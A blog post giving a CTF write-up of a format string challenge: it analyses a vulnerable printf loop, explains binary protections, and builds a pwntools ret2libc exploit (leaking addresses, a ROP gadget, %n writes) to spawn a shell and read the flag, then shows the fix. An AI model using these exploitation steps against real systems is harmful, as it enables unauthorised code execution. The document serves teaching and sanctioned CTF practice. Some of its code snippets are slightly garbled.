---
layout: post
title:  "Exploiting Format String with PwnTools"
date:   2020-07-14 08:42:27 +0100
categories: binary
---

This summer, the French Ministry of Defence has published a [CTF](https://quel-hacker-es-tu.defense.gouv.fr/).
Challenges were realistic: real names of groups, contexts, ... Some of them were "Blue Team"-oriented (find 
[IoC](https://en.wikipedia.org/wiki/Indicator_of_compromise) in a Kibana...), around forensic or more 
"Read-Team".

In this article, I will talk about the challenge "[ExploitMe](https://quel-hacker-es-tu.defense.gouv.fr/challenges/dicod/exploitme/)". This challenge is rated with a difficulty **Medium**. The aim is to exploit a vulnerability
on the remote server and read the flag. The challenge also gives you access to the binary and the libc.

## Finding a vulnerability

Let's start with analyzing the program:
```bash
$ ls -lhrt exploitme
-rwxrwxr-x 1 yvan yvan 14K juin  27 15:16 exploitme
$ file exploitme
exploitme: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=cb932ef9cd05b3df58183f784b75c7a8e40f1c5f, stripped
```

The file is small and stripped. Running the program **strings** doesn't reveal any useful information.
[DIE](http://ntinfo.biz/) indicates that the file is not packed or obfuscated. 

I used [ghidra](https://ghidra-sre.org/) to dissassembly the code. The main function is in the following snippet:
```C
  while( true ) {
    error = fgets(buffer,199,stdin);
    if (error == 0) break;
    printf(buffer);
    putchar(10);
    fflush(stdout);
  }
```
The program is simple:
 - Read a string from a user
 - Print it directly

Here, we smell a problem: the entry is directly printed without any filtering.
This lead to an **[Format String](https://www.exploit-db.com › docs › 28476-linux-format-string-exploitation)** 
vulnerability. We can easily test it by sending format string parameter to the remote server:

```bash
$ nc $ nc exploitme.chall.quel-hacker-es-tu.fr 55555
%p
0x7f7a6593a8d0
```
According to the manual of printf (**man 3 printf**), **%p** is used to print the parameter as a pointer. 
However, regarding the previous snippet of code, there is no parameter given to the function. So, where 
does this value come from?

## Understanding Format String vulnerability

Normally, when you call printf in a C program, to give it a string with the way you want to format the parameters:
```C
void main() {
  char name[] = "cotonne";
  int age     = 42;
  printf("My name is %s, I'm ~ %u y!", name, age);
}
```

If we look at the assembly code, we can see that those parameters are pushed to the stack:

```asm
mov    QWORD PTR [rbp-0x10],rax  # name
mov    DWORD PTR [rbp-0x14],0x2a # 0x2a = 42
...
call   0x1070 <printf@plt>
```

What will happen if you don't provide enough parameters? Well, printf will just to read data from the stack.
So, if we give too many parameters, printf just read one element at a time from the stack.
We can start to read information from the stack!

Not only we can read information from the stack, but we can also write information almost anywhere!
As indicated in the documentation, the printf parameter **%n** allows us to write at the address indicated
in the stack the number of printed characters. All the trick is then to print the correct number of characters
that will be equal to the value we want to write at the provided address.

## Defeating protections

Once we found the weakness, we need to find a way to exploit it. We aim to create a shell to read the file
containing the flag. But, for sure, we do have obstacles all along our way.

```python
>>> from pwn import *
>>> ELF('exploitme')
[*] '/home/yvan/tmp/defense/exploitme'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

So, let's see what we have:

 - Full RELRO: **RELRO** is for Relocation Read-Only. Linux uses ELF binary format. In this binary, functions called by the 
   program from dependent libraries (like **printf** from **libc**) are dynamically resolved. The first time the function is called,
   the address is resolved. If your program has a vulnerability that makes it possible to write somewhere in the memory, you can
   overwrite such address by your own (or replace the address of printf by the address of the function system).
 - Canary: The canary is a special value place on the stack. The value is set when you enter a function and is checked before
   the function is returned. It prevents us from overwriting the stack. It is a protection against buffer overflows.
 - NX:  NX for non-executable. If you change the return address by an address of the stack where you put some code, you would get
   a SEGFAULT. So, no shellcode on the stack.
 - PIE: it is the acronym for **Position-Independent Executable**. This mechanism allows the code to be executed at different positions.
   This enables Address space Layout Randomization (ASLR for short) making it harder (but not impossible) to craft exploits using 
   fixed address of the executed code.

So here, we have some problems:

 - We can't overwrite the Global Offset Table (GOT) due to RELRO
 - We should be careful when we overwrite the stack to not modify the canary value.
 - We can place a shell code in the stack 
 - We can't easily predict address

Well, those protections are not really annoying as we have a convenient vulnerability. With the format string vulnerability, we can
read the stack, find precisely interesting values, and overwrite them.

## Designing the exploit

### Easy, easy...

When we look at the code, we need to find a way to exploit the format string vulnerability.

Not only there are protections are in place, the code itself also makes it a bit more difficult:

 - The fgets function is correctly called. 199 characters are written. We can't expect to write as much as we want.
   Moreover, it limits the size of our exploit.
 - The function never returns as we are in a *while(true) loop*.

So, the only solution which came to my mind was to replace the return address of printf by the system ([ret2libc attack](http://wikisecu.fr/doku.php?id=appsysteme:ret2libc)). If we look at the code
of the function system, we can see that it reads its argument from the registry RDI. So, before calling it, we will need to 
set RDI with the address of the command line we want to execute. So, we have a find a ROP-gadget to pop a value to rdi.

And before all that, we will have to determine what is the real address of system and where should we write this address on the 
stack. ASLR is enabled, so the address is not fixed.

And before before all that, we need to be able to run things correctly with the format string exploit.

### Making format string to work with pwntools

As explained before, printf will read the stack for extra argument. If we send the string "%p%p", it will read the first two
values from the stack. You can also print the second value from the stack by calling "%2$p". If we know where is the string 
we control, we will be able to also set the address that we want to update.

So you can do it by hand (or by writing some code). Just put a recognizable pattern and iter.
You should find that the beginning of our string is at position 6:

```bash
$ nc exploitme.chall.quel-hacker-es-tu.fr 55555
ABCDEFGH%6$p
ABCDEFGH0x4847464544434241
```

Or you can be lazy and use pwntools with the package FmtStr :

```python
from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *
context.clear(arch = 'amd64')
def send_payload(payload):
        s.sendline(payload)
        r = s.recvline()
        s.recvline()
        return r

s = process('./exploitme')
print(FmtStr(execute_fmt=send_payload).offset)
...
[*] Found format string offset: 6
6
```

Quite efficient, isn't it?

Once done, we need to find useful addresses. If we look at the code, the call stack should be:

```
Top of stack
... stuff ...
return address to entry function
...
return address of __libc_start_main
...
return address of main function
...
return address of printf
...
```

We will need to find the position to read address we want.
Here, I didn't automate this part. I had to dump the stack with a position going from 1 to 100 and
find where are the addresses I was looking for. I run the program locally and debug it with GDB.
This way, I was able to know which was the return address and see how I can print it.
I did the same with the remote program as some changes might exist between my system and the remote
program. I had also to do some math to find some EBP pointer (called later **Y**) which is an address
of the stack and calculate the shift to the position of the printf return address.

Now, I have:

 - the position of the string I control, so i know where I should write the address
 - the position of an interesting address. We will use the return address of the `__libc_start_main`.

In the library libc, we will found everything we need:

 - The base address of `__libc_start_main`.
 - The base address of `system`
 - Our argument. We want a string equals to '/bin/sh'. With pwntools, you can easily find it:

```python
libc = ELF(PATH_TO_LIBC)
address_libc_start_main = libc.symbols['__libc_start_main']
address_system_libc     = libc.symbols['system']
STR_binsh = next(libc.search(b'/bin/sh'))
```

  - A ROP-gagdet which do something like `pop rdi; ret`.

```python
rop = ROP(libc)
gadget_pop = rop.find_gadget(['pop rdi', 'ret'])
ROP_pop_rdi_ret = gadget_pop.address
```

One last thing I had to find by hand was the shift (called later **S**) from the base address of `__libc_start_main` to the call of 
`main`. A little bit of GDB do the trick.

## Writing the exploit!

Now, we have everything we need. Here is the algorithm:

 1. In libc, find addresses of `__libc_start_main`, `system`, "pop rdi" gadget and string "/bin/sh" thanks to pwntools
 2. Connect to remote program
 3. Send "%X$p" with X equal to the position of the EBP stored in the stack. Add the shift to get the position of the return address of printf call.
 4. Send "%Y$p" with Y equal to the return address of libc_start_main. Remove the shift **S** and the base address of libc_start_main to get the 
    address in memory of libc. You can then add the base address of system, the ROP gadget and the binsh string to get their real address in 
    memory
 5. Call FmtStr to calculate the offset. 
 6. Provide addresses and values that need to be written to FmtStr.
    Don't forget to provide the number of character already written as %n will use it to write the value in the memory.

FmtStr automates all the boring stuff.

With the format string exploit, the number of characters will be written at the provided address. But, what if we want to write the value
**0x7f3722bcc8d0**, so 2134319804 characters need to be printed? This will take ages! The solution is to split it in multiple smaller values
and use overflows. So 256 printed characters are equal to 0. With our number, it will be:

 - Print 0xd0 characters and used %n on the address A. The address A contains **0xd0**.
 - Print (256 - 0xd0) + 0xc8 characters and used %n on the address A + 1. The address A contains **0xc8d0**.
 - Print (256 - 0xc8) + 0xbc characters and used %n on the address A + 2. The address A contains **0xbcc8d0**.

So, the stack should look like this at the end of printf:

```
hex(return_address_of_printf + 16) + " : " + hex(system_addr)   + " # addr system_addr")
print(hex(return_address_of_printf +  8) + " : " + hex(address_binsh) + " # addr string '/bin/sh'")
print(hex(return_address_of_printf)      + " : " + hex(address_pop_rdi_ret)   + " # addr pop rdi ; ret")
```

However, we have to write 6 addresses of 8 bytes. So 48 writes. Each address takes 8 bytes not counting the print of characters.
we have limited space (199 characters). FmtStr provides different formats from 1 byte to more.

You can find the code here.

Let's run it:

```bash
$ python3 format-string.py remote 0

... Running ...

.. Interactive mode ...

$ whoami
chall
$ ls
chall
flag
$ cat flag
FLAG{sImp3_BaSiQ_S1mp13_b4S1k}
```

## Fixing it!

As a developer, I can be interested in a way to fix this issue.

First, at compilation, if the format string is known, GCC will comply about missing parameters:

```bash
$ gcc test.c 
test.c: In function ‘main’:
test.c:4:11: warning: format ‘%p’ expects a matching ‘void *’ argument [-Wformat=]
    4 |  printf("%p");
```

However, in our case, the string is provided at runtime.

Here, we should have:

 - Check that the string doesn't contain dangerous characters
 - Provided the format

```C
print("%s", buffer);
```


